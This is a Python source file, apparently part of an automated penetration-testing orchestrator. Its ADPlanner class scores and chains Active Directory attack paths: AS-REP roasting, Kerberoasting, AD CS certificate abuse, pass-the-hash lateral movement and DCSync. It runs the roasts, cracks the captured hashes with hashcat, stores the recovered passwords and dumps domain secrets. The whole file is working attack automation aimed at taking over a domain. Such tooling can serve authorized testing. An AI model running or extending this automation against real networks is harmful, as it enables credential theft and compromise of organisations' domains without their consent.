import json
import logging
from typing import Optional

from orchestrator.ad.toolkit import get_ad_toolkit
from orchestrator.ad.hashcat_wrapper import HashcatWrapper
from orchestrator.ad.keyring import get_keyring

logger = logging.getLogger("ad_planner")


class ADPlanner:
    ATTACK_PATHS = [
        {
            "name": "AS-REP Roast → Crack → DA",
            "rank": 1,
            "detections": ["asrep", "kerberoast", "does not require Kerberos preauthentication"],
            "actions": ["getnpusers", "crack", "dcsync"],
            "requires_creds": False,
        },
        {
            "name": "Kerberoast → Crack → DA",
            "rank": 2,
            "detections": ["kerberoast", "service principal name", "spn"],
            "actions": ["getuserspns", "crack", "dcsync"],
            "requires_creds": True,
        },
        {
            "name": "AD CS Abuse (ESC1-ESC8)",
            "rank": 3,
            "detections": ["certificate", "ca", "ad cs", "cert template", "esc"],
            "actions": ["certipy_find", "certipy_req", "certipy_auth", "dcsync"],
            "requires_creds": True,
        },
        {
            "name": "DCSync (DA access)",
            "rank": 4,
            "detections": ["dcsync", "domain admin", "replication"],
            "actions": ["secretsdump_dcsync"],
            "requires_creds": True,
        },
        {
            "name": "Pass-the-Hash lateral",
            "rank": 5,
            "detections": ["smb", "wmi", "winrm", "admin share"],
            "actions": ["wmiexec", "psexec", "secretsdump"],
            "requires_creds": True,
        },
    ]

    def __init__(self):
        self._ad = get_ad_toolkit()
        self._hashcat = HashcatWrapper()
        self._keyring = get_keyring()

    def analyze(self, target: str, domain: str = "",
                findings: Optional[list[dict]] = None) -> list[dict]:
        results = []
        for path in self.ATTACK_PATHS:
            score = 0
            reasons = []
            if findings:
                for f in findings:
                    desc = (f.get("description", "") + " " + f.get("evidence", "")).lower()
                    for det in path["detections"]:
                        if det in desc:
                            score += 25
                            reasons.append(f"detected: {det}")

            if path["requires_creds"]:
                creds = self._keyring.find(target=target, cracked_only=True)
                if creds:
                    score += 30
                    reasons.append(f"cracked creds available: {creds[0].username}")
                elif domain:
                    low_priv = self._keyring.find(target=f"{domain}.local", cracked_only=True)
                    if low_priv:
                        score += 10
                        reasons.append("low-priv creds available")

            results.append({
                "path": path["name"],
                "rank": path["rank"],
                "score": score,
                "feasible": score >= 30,
                "actions": path["actions"],
                "reasons": reasons,
            })

        results.sort(key=lambda x: (-x["score"], x["rank"]))
        return results

    def suggest_next_action(self, target: str, domain: str,
                            findings: list[dict]) -> Optional[str]:
        paths = self.analyze(target, domain, findings)
        feasible = [p for p in paths if p["feasible"]]
        if feasible:
            best = feasible[0]
            logger.info(f"AD Planner: recommending '{best['path']}' (score={best['score']})")
            return f"[{best['path']}] {best['actions'][0]}"
        if paths:
            best = paths[0]
            logger.info(f"AD Planner: no feasible path, best candidate '{best['path']}' (score={best['score']})")
            if best["actions"][0] == "getnpusers":
                return "getnpusers"
            if best["actions"][0] == "getuserspns" and findings:
                return "getuserspns"
            return best["actions"][0] if best["actions"] else None
        return None

    def getnpusers(self, target: str, domain: str = "") -> list[dict]:
        from orchestrator.ad.toolkit import get_ad_toolkit
        ad = get_ad_toolkit()
        domain = domain or target
        result = ad.getnpusers(domain)
        logger.info(f"AD Planner: AS-REP roast found {len(result.get('users', []))} users")
        for user in result.get("users", []):
            self._keyring.store(target, user.get("username", "unknown"),
                                hash_val=user.get("hash", ""),
                                service="kerberos", source="asrep_roast")
        return result.get("users", [])

    def getuserspns(self, target: str, domain: str = "",
                    username: str = "", password: str = "") -> list[dict]:
        from orchestrator.ad.toolkit import get_ad_toolkit
        ad = get_ad_toolkit()
        domain = domain or target
        result = ad.getuserspns(domain, username=username, password=password)
        logger.info(f"AD Planner: Kerberoast found {len(result.get('users', []))} users")
        for user in result.get("users", []):
            self._keyring.store(target, user.get("username", "unknown"),
                                hash_val=user.get("hash", ""),
                                service="kerberos", source="kerberoast")
        return result.get("users", [])

    def crack_all(self, target: str) -> list[dict]:
        hashes = self._keyring.find(target=target)
        results = []
        for cred in hashes:
            if cred.hash and not cred.cracked:
                r = self._hashcat.crack_hash(cred.hash)
                if r.get("success") and r.get("plaintext"):
                    cred.password = r["plaintext"]
                    cred.cracked = True
                    self._keyring.store(cred.target, cred.username, password=r["plaintext"],
                                        hash_val=cred.hash, service=cred.service,
                                        source=cred.source)
                    self._keyring.mark_cracked(0)
                    results.append(r)
        return results

    def dcsync(self, target: str, username: str = "", password: str = "",
               domain: str = "") -> dict:
        from orchestrator.ad.toolkit import get_ad_toolkit
        ad = get_ad_toolkit()
        return ad.secretsdump(target, username=username, password=password,
                              domain=domain, dcsync=True)
